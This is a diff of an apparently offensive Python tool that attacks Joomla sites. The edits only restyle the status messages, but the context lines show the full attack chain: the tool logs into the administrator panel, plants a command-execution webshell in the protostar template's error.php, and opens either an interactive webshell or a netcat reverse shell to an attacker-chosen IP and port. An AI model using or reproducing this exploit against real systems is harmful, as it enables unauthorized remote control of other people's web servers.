@@ -29,7 +29,7 @@ def get_hidden_values(url):
     try:
         response = requests.get(f"{url}/administrator/index.php")
     except requests.exceptions.MissingSchema:
-        print("[-] Please specify a correct ip")
+        print(f"{failed()} Please specify a correct ip")
         print("Exit 🐘")
         sys.exit(1)
     except TypeError:
@@ -71,15 +71,15 @@ def post_login_joomla(user, password, url, hidden_values):
         hidden_values.get('1', ''): '1'
     }
     
-    host = (f"{url}/administrator/index.php")
+    host = f"{url}/administrator/index.php"
 
     response = requests.post(host, data, allow_redirects=True)
 
     print(response.request)
     # Debug
-    print("[+] Start login into admin")
-    print(f'[+] {data}')
-    print(f'[+] Status code: {response.status_code}')
+    print(f"{ongoing()} Start login into admin")
+    print(f'{ongoing()} {data}')
+    print(f'{success()} Status code: {response.status_code}')
     # Lunch
     put_exploit_joomla(url)
     
@@ -96,7 +96,7 @@ def put_exploit_joomla(url):
     response = requests.post(host, data, allow_redirects=True)
     print(response.status_code)
     
-    print("[Exploit] Starting the exploit")
+    print(f"{ongoing()} Starting the exploit")
     host = f"{url}/templates/protostar/error.php/error.php?cmd="
     print(host)
     cmd_echo = f"{host}echo%20%27HelloWorld%27"
@@ -106,7 +106,7 @@ def put_exploit_joomla(url):
     print(response.content.decode('utf-8'))
     
     if "HelloWorld" in response.content.decode('utf-8'):
-        print("[+] Open input user, let's start hacking")
+        print(f"{success()} Open input user, let's start hacking")
 
         while True:
             print("Which mode are you choosing ? [1]: Webshell, [2]: Reverseshell :")
@@ -114,16 +114,16 @@ def put_exploit_joomla(url):
 
             match user_choice:
                 case '1':
-                    print('[+] Webshell')
+                    print(f'{success()} Webshell')
                     webshell_joomla(host)
                 case '2':
-                    print('[+] Reverseshell')
+                    print(f'{success()} Reverseshell')
                     reverse_shell_joomla(host)
                 case _:
-                    print('[!] select a mode!')
+                    print(f'{warning()} select a mode!')
 
     else:
-        print("[-] Can't open a shell")
+        print(f"{failed()} Can't open a shell")
 
 
 def webshell_joomla(host):
@@ -152,9 +152,9 @@ def reverse_shell_joomla(host):
     reverse_shell_cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {user_ip} {user_port} >/tmp/f"
 
     new_url = f"{host}{reverse_shell_cmd}"
-    print(f"[+] Your ip: {user_ip}")
-    print(f"[+] Your port: {user_port}")
-    print("[+] Launching the reverse shell")
+    print(f"{success()} Your ip: {user_ip}")
+    print(f"{success()} Your port: {user_port}")
+    print(f"{success()} Launching the reverse shell")
     requests.get(new_url)
 
     # Todo : look to use the multi/handler from msf directly within the tool ?
@@ -175,9 +175,9 @@ def main():
 
     if args.mode:
         if args.mode == 'wordpress':
-            print('[+] Mode: wordpress')
+            print(f'{success()} Mode: wordpress')
         elif args.mode == 'joomla':
-            print('[+] Mode: joomla')
+            print(f'{success()} Mode: joomla')
             hidden_values = get_hidden_values(args.host)
             post_login_joomla(args.username, args.password, args.host, hidden_values)
     else:
